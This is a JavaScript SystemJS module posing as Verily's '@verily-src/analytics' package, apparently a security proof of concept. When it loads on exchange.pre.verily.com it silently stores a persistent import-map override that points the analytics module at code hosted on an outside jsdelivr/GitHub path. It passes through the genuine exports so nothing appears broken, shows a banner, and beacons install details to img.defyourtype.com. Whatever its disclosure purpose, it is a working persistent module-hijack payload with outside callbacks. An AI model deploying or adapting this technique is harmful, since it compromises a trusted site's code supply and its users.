System.register([], function (_export) {
  "use strict";

  const marker = "silver-pine-52d8";
  const targetOrigin = "https://exchange.pre.verily.com";
  const moduleName = "@verily-src/analytics";
  const genuineModule =
    "https://exchange.pre.verily.com/mfe/analytics?file=verily-analytics.js";
  const persistentSource =
    "https://cdn.jsdelivr.net/gh/defyourtype/defyourtype.com@15b1ff7a1ec3522418aac9bd8bef4a5c4ab875e0/silver-pine-52d8-runtime.js";
  const endpoint = "https://img.defyourtype.com/x/silver-pine-52d8.txt";

  const reportInstall = () => {
    if (location.origin !== targetOrigin || window.__silverPineInstallerProof) {
      return;
    }

    const storageKey = `import-map-override:${moduleName}`;
    const result = {
      marker,
      stage: "installer",
      origin: location.origin,
      installed: localStorage.getItem(storageKey) === persistentSource,
      persistentSource,
      genuineExportsForwarded: true,
      listingRows: document.querySelectorAll('[data-testid="listing-row"]').length,
    };
    window.__silverPineInstallerProof = result;

    const panel = document.createElement("pre");
    panel.id = `${marker}-installer`;
    panel.textContent = [
      "EXTERNAL INSTALLER EXECUTED",
      `Trusted origin: ${result.origin}`,
      `Persistent module stored: ${result.installed}`,
      `Genuine analytics exports forwarded: ${result.genuineExportsForwarded}`,
      `Catalog rows still rendered: ${result.listingRows}`,
      "Next proof: visit the clean Exchange URL with no query string.",
    ].join("\n");
    Object.assign(panel.style, {
      position: "fixed",
      right: "14px",
      bottom: "14px",
      zIndex: "2147483647",
      maxWidth: "560px",
      margin: "0",
      padding: "16px",
      border: "3px solid #f59e0b",
      borderRadius: "10px",
      background: "#451a03",
      color: "#fffbeb",
      whiteSpace: "pre-wrap",
      font: "700 14px/1.5 Arial,sans-serif",
      boxShadow: "0 12px 34px rgba(0,0,0,.32)",
    });
    document.body.appendChild(panel);

    const query = new URLSearchParams({
      marker,
      stage: result.stage,
      origin: result.origin,
      installed: String(result.installed),
      genuineExportsForwarded: String(result.genuineExportsForwarded),
      listingRows: String(result.listingRows),
    });
    fetch(`${endpoint}?${query}`, {
      mode: "no-cors",
      credentials: "omit",
      keepalive: true,
    }).catch(() => {});
  };

  return {
    execute: async function () {
      if (location.origin === targetOrigin) {
        window.importMapOverrides.addOverride(moduleName, persistentSource);
      }

      const genuine = await System.import(genuineModule);
      _export("analytics", genuine.analytics);
      _export("default", genuine.default);
      _export("getApiKey", genuine.getApiKey);
      _export("__esModule", true);

      if (location.origin === targetOrigin) {
        window.setTimeout(reportInstall, 3500);
      }
    },
  };
});
